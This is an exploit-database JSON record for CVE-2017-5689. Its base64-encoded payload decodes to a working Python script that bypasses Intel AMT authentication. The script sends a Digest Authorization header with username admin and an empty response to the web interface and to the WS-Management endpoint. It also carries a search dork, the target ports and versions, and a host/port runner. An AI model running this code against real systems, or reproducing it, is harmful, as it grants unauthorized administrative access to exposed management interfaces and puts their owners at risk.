{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiMgLSotIGNvZGluZzogdXRmLTggLSotDQoNCiMgQXV0aG9yOiBOaXhhd2sNCg0KIyAgIENWRS0yMDE3LTU2ODkgPSB7DQojICAgICAgIGRvcms9IlNlcnZlcjogSW50ZWwoUikgQWN0aXZlIE1hbmFnZW1lbnQgVGVjaG5vbG9neSIgcG9ydDoiMTY5OTIiLA0KIyAgICAgICBwb3J0cz1bDQojICAgICAgICAgICA2MjMsDQojICAgICAgICAgICA2NjQsDQojICAgICAgICAgICAxNjk5MiwNCiMgICAgICAgICAgIDE2OTkzLA0KIyAgICAgICAgICAgMTY5OTQsDQojICAgICAgICAgICAxNjk5NQ0KIyAgICAgICBdDQojICAgICAgIHByb2R1Y3RzPVsNCiMgICAgICAgICAgIEFjdGl2ZSBNYW5hZ2VtZW50IFRlY2hub2xvZ3kgKEFNVCksDQojICAgICAgICAgICBJbnRlbCBTdGFuZGFyZCBNYW5hZ2VhYmlsaXR5IChJU00pLA0KIyAgICAgICAgICAgSW50ZWwgU21hbGwgQnVzaW5lc3MgVGVjaG5vbG9neSAoU0JUKQ0KIyAgICAgICBdDQojICAgICAgIHZlcnNpb249Ww0KIyAgICAgICAgICAgNi54LA0KIyAgICAgICAgICAgNy54LA0KIyAgICAgICAgICAgOC54LA0KIyAgICAgICAgICAgOS54LA0KIyAgICAgICAgICAgMTAueCwNCiMgICAgICAgICAgIDExLjAsDQojICAgICAgICAgICAxMS41LA0KIyAgICAgICAgICAgMTEuNg0KIyAgICAgICBdDQoNCmltcG9ydCBmdW5jdG9vbHMNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCB1dWlkDQoNCg0KbG9nZ2luZy5iYXNpY0NvbmZpZyhsZXZlbD1sb2dnaW5nLklORk8sIGZvcm1hdD0iJShtZXNzYWdlKXMiKQ0KbG9nID0gbG9nZ2luZy5nZXRMb2dnZXIoX19maWxlX18pDQoNClRJTUVPVVQgPSA4DQoNCg0KZGVmIGhhbmRsZV9leGNlcHRpb24oZnVuYyk6DQogICAgZnVuY3Rvb2xzLndyYXBzKGZ1bmMpDQogICAgZGVmIHdyYXBwZXIoKmFyZ3MsICoqa3dkcyk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHJldHVybiBmdW5jKCphcmdzLCAqKmt3ZHMpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZXJyOg0KICAgICAgICAgICAgbG9nLmVycm9yKGVycikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KICAgIHJldHVybiB3cmFwcGVyDQoNCg0KZGVmIGludGVsX3Z1bG5lcmFibGVfcHJvZHVjdChzZXJ2ZXIpOg0KICAgIHN0YXR1cyA9IEZhbHNlDQogICAgcHJvZHVjdHMgPSBbDQogICAgICAgICdJbnRlbChSKSBBY3RpdmUgTWFuYWdlbWVudCBUZWNobm9sb2d5JywNCiAgICAgICAgJ0ludGVsKFIpIFN0YW5kYXJkIE1hbmFnZWFiaWxpdHknLA0KICAgICAgICAnSW50ZWwoUikgU21hbGwgQnVzaW5lc3MgVGVjaG5vbG9neScsDQogICAgICAgICdBTVQnDQogICAgXQ0KDQogICAgcmVzdWx0cyA9IG1hcChsYW1iZGEgeDogeCBpbiBzZXJ2ZXIsIHByb2R1Y3RzKQ0KICAgIHN0YXR1cyA9IFRydWUgaWYgKFRydWUgaW4gcmVzdWx0cykgZWxzZSBGYWxzZQ0KICAgIHJldHVybiBzdGF0dXMNCg0KDQpAaGFuZGxlX2V4Y2VwdGlvbg0KZGVmIGV4cGxvaXRfd2ViX2ludGVyZmFjZShob3N0LCBwb3J0KToNCiAgICBzdGF0dXMgPSBGYWxzZQ0KDQogICAgdXJsID0gImh0dHA6Ly97aG9zdH06e3BvcnR9L2luZGV4Lmh0bSIuZm9ybWF0KGhvc3Q9aG9zdCwgcG9ydD1wb3J0KQ0KICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAifQ0KICAgIGh0dHByc3AgPSByZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9VElNRU9VVCkNCg0KICAgIGlmIG5vdCBpbnRlbF92dWxuZXJhYmxlX3Byb2R1Y3QoaHR0cHJzcC5oZWFkZXJzWydTZXJ2ZXInXSk6IHJldHVybiBzdGF0dXMNCg0KICAgICIiIg0KICAgIEdFVCAvaW5kZXguaHRtIEhUVFAvMS4xDQogICAgSG9zdDogMTkyLjE2OC4xLjEwMDoxNjk5Mg0KICAgIENvbm5lY3Rpb246IGtlZXAtYWxpdmUNCiAgICBBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCiAgICBBY2NlcHQ6ICovKg0KICAgIFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wDQoNCiAgICBIVFRQLzEuMSA0MDEgVW5hdXRob3JpemVkDQogICAgV1dXLUF1dGhlbnRpY2F0ZTogRGlnZXN0IHJlYWxtPSJEaWdlc3Q6N0JBNzAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAiLCBub25jZT0iL3RzZkFBWUdBQURkeCtUQ0xTbFhzVzdGTjdHWS9oZjciLHN0YWxlPSJmYWxzZSIscW9wPSJhdXRoIg0KICAgIENvbnRlbnQtVHlwZTogdGV4dC9odG1sDQogICAgU2VydmVyOiBJbnRlbChSKSBBY3RpdmUgTWFuYWdlbWVudCBUZWNobm9sb2d5IDguMS40MA0KICAgIENvbnRlbnQtTGVuZ3RoOiA2ODkNCiAgICBDb25uZWN0aW9uOiBjbG9zZQ0KICAgICIiIg0KDQogICAgd3d3X2F1dGhlbnRpY2F0ZSA9IGh0dHByc3AuaGVhZGVycy5nZXQoJ1dXVy1BdXRoZW50aWNhdGUnKQ0KICAgIHd3d19hdXRoZW50aWNhdGUgPSB3d3dfYXV0aGVudGljYXRlLnJlcGxhY2UoDQogICAgICAgICdzdGFsZT0iZmFsc2UiJywNCiAgICAgICAgJ3VzZXJuYW1lPWFkbWluLHJlc3BvbnNlPSx1cmk9L2luZGV4Lmh0bSxuYz0wMDAwMDAwMSxjbm9uY2U9NjA1MTNhYjU4ODU4NDgyYycNCiAgICApDQogICAgaGVhZGVycy51cGRhdGUoeyJBdXRob3JpemF0aW9uIjogd3d3X2F1dGhlbnRpY2F0ZX0pDQoNCiAgICBodHRwcnNwID0gcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzLCB0aW1lb3V0PVRJTUVPVVQpDQoNCiAgICBpZiBub3QgaHR0cHJzcDogcmV0dXJuIHN0YXR1cw0KICAgIGlmIG5vdCBodHRwcnNwLmhlYWRlcnM6IHJldHVybiBzdGF0dXMNCiAgICBpZiBub3QgaW50ZWxfdnVsbmVyYWJsZV9wcm9kdWN0KGh0dHByc3AuaGVhZGVyc1snU2VydmVyJ10pOiByZXR1cm4gc3RhdHVzDQogICAgaWYgaHR0cHJzcC5zdGF0dXNfY29kZSA9PSAyMDA6IHN0YXR1cyA9IFRydWUNCg0KICAgICIiIg0KICAgIEdFVCAvaW5kZXguaHRtIEhUVFAvMS4xDQogICAgSG9zdDogMTkyLjE2OC4xLjEwMDoxNjk5Mg0KICAgIENvbm5lY3Rpb246IGtlZXAtYWxpdmUNCiAgICBBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCiAgICBBY2NlcHQ6ICovKg0KICAgIFVzZXItQWdlbnQ6IHB5dGhvbi1yZXF1ZXN0cy8yLjEzLjANCiAgICBBdXRob3JpemF0aW9uOiBEaWdlc3QgcmVhbG09IkRpZ2VzdDo3QkE3MDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMCIsIG5vbmNlPSIvdHNmQUFZR0FBRGR4K1RDTFNsWHNXN0ZON0dZL2hmNyIsdXNlcm5hbWU9YWRtaW4scmVzcG9uc2U9LHVyaT0vaW5kZXguaHRtLG5jPTAwMDAwMDAxLGNub25jZT02MDUxM2FiNTg4NTg0ODJjLHFvcD0iYXV0aCINCg0KICAgIEhUVFAvMS4xIDIwMCBPSw0KICAgIERhdGU6IFNhdCwgNiBNYXkgMjAxNyAwMzoyNDozMyBHTVQNCiAgICBTZXJ2ZXI6IEludGVsKFIpIEFjdGl2ZSBNYW5hZ2VtZW50IFRlY2hub2xvZ3kgOC4xLjQwDQogICAgQ29udGVudC1UeXBlOiB0ZXh0L2h0bWwNCiAgICBUcmFuc2Zlci1FbmNvZGluZzogY2h1bmtlZA0KICAgIENhY2hlLUNvbnRyb2w6IG5vIGNhY2hlDQogICAgRXhwaXJlczogVGh1LCAyNiBPY3QgMTk5NSAwMDowMDowMCBHTVQNCg0KICAgIDA0QTkNCiAgICAiIiINCiAgICByZXR1cm4gc3RhdHVzDQoNCg0KQGhhbmRsZV9leGNlcHRpb24NCmRlZiBleHBsb2l0X3dzbWFuKGhvc3QsIHBvcnQpOg0KICAgIHN0YXR1cyA9IEZhbHNlDQoNCiAgICB1cmwgPSAiaHR0cDovL3tob3N0fTp7cG9ydH0vd3NtYW4iLmZvcm1hdChob3N0PWhvc3QsIHBvcnQ9cG9ydCkNCiAgICBzb2FwID0gKA0KICAgICAgICAnPHNvYXA6RW52ZWxvcGUgeG1sbnM6c29hcD0iaHR0cDovL3d3dy53My5vcmcvMjAwMy8wNS9zb2FwLWVudmVsb3BlIiB4bWxuczp0bnM9Imh0dHA6Ly9zY2hlbWFzLmRtdGYub3JnL3diZW0vd3NjaW0vMS9jaW0tc2NoZW1hLzIvQ0lNX1NvZnR3YXJlSWRlbnRpdHkiIHhtbG5zOndzZGw9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzZGwvIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp3c21hbj0iaHR0cDovL3NjaGVtYXMuZG10Zi5vcmcvd2JlbS93c21hbi8xL3dzbWFuLnhzZCIgeG1sbnM6d3NjYXQ9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDYvd3NtYW5jYXQiIHhtbG5zOndzYT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNC8wOC9hZGRyZXNzaW5nIiB4bWxuczp3eGY9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDQvMDkvdHJhbnNmZXIiIHhtbG5zOndzZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNC8wOC9ldmVudGluZyIgeG1sbnM6Y2ltPSJodHRwOi8vc2NoZW1hcy5kbXRmLm9yZy93YmVtL3dzY2ltLzEvY29tbW9uIiB4bWxuczp3c2VuPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA0LzA5L2VudW1lcmF0aW9uIj4nDQogICAgICAgICcgIDxzb2FwOkhlYWRlcj4nDQogICAgICAgICcgICAgPHdzYTpUbz57dXJsfTwvd3NhOlRvPicNCiAgICAgICAgJyAgICA8d3NhOlJlcGx5VG8+Jw0KICAgICAgICAnICAgICAgPHdzYTpBZGRyZXNzIHNvYXA6bXVzdFVuZGVyc3RhbmQ9InRydWUiPmh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDQvMDgvYWRkcmVzc2luZy9yb2xlL2Fub255bW91czwvd3NhOkFkZHJlc3M+Jw0KICAgICAgICAnICAgIDwvd3NhOlJlcGx5VG8+Jw0KICAgICAgICAnICAgIDx3c2E6QWN0aW9uIHNvYXA6bXVzdFVuZGVyc3RhbmQ9InRydWUiPmh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDQvMDkvdHJhbnNmZXIvR2V0PC93c2E6QWN0aW9uPicNCiAgICAgICAgJyAgICA8d3NtYW46TWF4RW52ZWxvcGVTaXplIHNvYXA6bXVzdFVuZGVyc3RhbmQ9InRydWUiPjUxMjAwPC93c21hbjpNYXhFbnZlbG9wZVNpemU+Jw0KICAgICAgICAnICAgIDx3c2E6TWVzc2FnZUlEPnV1aWQ6e3V1aWR9PC93c2E6TWVzc2FnZUlEPicNCiAgICAgICAgJyAgICA8d3NtYW46UmVzb3VyY2VVUkkgc29hcDptdXN0VW5kZXJzdGFuZD0idHJ1ZSI+aHR0cDovL3NjaGVtYXMuZG10Zi5vcmcvd2JlbS93c2NpbS8xL2NpbS1zY2hlbWEvMi9DSU1fU29mdHdhcmVJZGVudGl0eTwvd3NtYW46UmVzb3VyY2VVUkk+Jw0KICAgICAgICAnICAgIDx3c21hbjpTZWxlY3RvclNldD4nDQogICAgICAgICcgICAgICA8d3NtYW46U2VsZWN0b3IgTmFtZT0iSW5zdGFuY2VJRCI+QU1UIEZXIENvcmUgVmVyc2lvbjwvd3NtYW46U2VsZWN0b3I+Jw0KICAgICAgICAnICAgIDwvd3NtYW46U2VsZWN0b3JTZXQ+Jw0KICAgICAgICAnICAgIDx3c21hbjpPcGVyYXRpb25UaW1lb3V0PlBUNjAuMDAwUzwvd3NtYW46T3BlcmF0aW9uVGltZW91dD4nDQogICAgICAgICcgIDwvc29hcDpIZWFkZXI+Jw0KICAgICAgICAnICA8c29hcDpCb2R5IC8+Jw0KICAgICAgICAnPC9zb2FwOkVudmVsb3BlPicNCiAgICApLmZvcm1hdCh1cmw9dXJsLCB1dWlkPXN0cih1dWlkLnV1aWQ0KCkpKQ0KDQogICAgaGVhZGVycyA9IHsiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vc29hcCt4bWw7IGNoYXJzZXQ9VVRGLTgifQ0KICAgIGh0dHByc3AgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1zb2FwLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9VElNRU9VVCkNCg0KICAgIGlmIG5vdCBpbnRlbF92dWxuZXJhYmxlX3Byb2R1Y3QoaHR0cHJzcC5oZWFkZXJzWydTZXJ2ZXInXSk6IHJldHVybiBzdGF0dXMNCiAgICB3d3dfYXV0aGVudGljYXRlID0gaHR0cHJzcC5oZWFkZXJzLmdldCgnV1dXLUF1dGhlbnRpY2F0ZScpDQogICAgd3d3X2F1dGhlbnRpY2F0ZSA9IHd3d19hdXRoZW50aWNhdGUucmVwbGFjZSgNCiAgICAgICAgJ3N0YWxlPSJmYWxzZSInLA0KICAgICAgICAndXNlcm5hbWU9YWRtaW4scmVzcG9uc2U9LHVyaT0vaW5kZXguaHRtLG5jPTAwMDAwMDAxLGNub25jZT02MDUxM2FiNTg4NTg0ODJjJw0KICAgICkNCiAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB3d3dfYXV0aGVudGljYXRlfSkNCg0KICAgIGh0dHByc3AgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1zb2FwLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9VElNRU9VVCkNCg0KICAgIGlmIG5vdCBodHRwcnNwOiByZXR1cm4gc3RhdHVzDQogICAgaWYgbm90IGh0dHByc3AuaGVhZGVyczogcmV0dXJuIHN0YXR1cw0KICAgIGlmIG5vdCBpbnRlbF92dWxuZXJhYmxlX3Byb2R1Y3QoaHR0cHJzcC5oZWFkZXJzWydTZXJ2ZXInXSk6IHJldHVybiBzdGF0dXMNCiAgICBpZiBodHRwcnNwLnN0YXR1c19jb2RlID09IDIwMDogc3RhdHVzID0gVHJ1ZQ0KICAgIHJldHVybiBzdGF0dXMNCg0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIGltcG9ydCBzeXMNCiAgICBpZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogICAgICAgIGxvZy5pbmZvKCJbK10gVXNhZ2U6IHB5dGhvbiB7fSA8aG9zdD4gPHBvcnQ+Ii5mb3JtYXQoc3lzLmFyZ3ZbMF0pKQ0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgaG9zdCwgcG9ydCA9IHN5cy5hcmd2WzFdLCBzeXMuYXJndlsyXQ0KICAgIGlmIGV4cGxvaXRfd2ViX2ludGVyZmFjZShob3N0LCBwb3J0KSBvciBleHBsb2l0X3dzbWFuKGhvc3QsIHBvcnQpOg0KICAgICAgICBsb2cuaW5mbygiW3N1Y2Nlc3NdIENWRS0yMDE3LTU2ODkgLSB7aG9zdH06e3BvcnR9Ii5mb3JtYXQoaG9zdD1ob3N0LCBwb3J0PXBvcnQpKQ0KICAgIGVsc2U6DQogICAgICAgIGxvZy5pbmZvKCJbZmFpbGVkXSAgQ1ZFLTIwMTctNTY4OSAtIHtob3N0fTp7cG9ydH0iLmZvcm1hdChob3N0PWhvc3QsIHBvcnQ9cG9ydCkpDQoNCiMjIFJlZmVyZW5jZXMNCg0KIyBodHRwOi8vdGhlaGFja2VybmV3cy5jb20vMjAxNy8wNS9pbnRlbC1hbXQtdnVsbmVyYWJpbGl0eS5odG1sDQojIGh0dHBzOi8vd3d3LnNzaC5jb20vdnVsbmVyYWJpbGl0eS9pbnRlbC1hbXQvDQojIGh0dHBzOi8vd3d3LnNob2Rhbi5pby9yZXBvcnQvbW5Bb3picEMNCiMgaHR0cHM6Ly93d3cuZW1iZWRpLmNvbS9maWxlcy93aGl0ZS1wYXBlcnMvU2lsZW50LUJvYi1pcy1TaWxlbnQucGRmDQojIGh0dHBzOi8vd3d3LnRlbmFibGUuY29tL2Jsb2cvcmVkaXNjb3ZlcmluZy10aGUtaW50ZWwtYW10LXZ1bG5lcmFiaWxpdHk=", 
    "id": "43385", 
    "cves": [
        "CVE-2017-5689"
    ]
}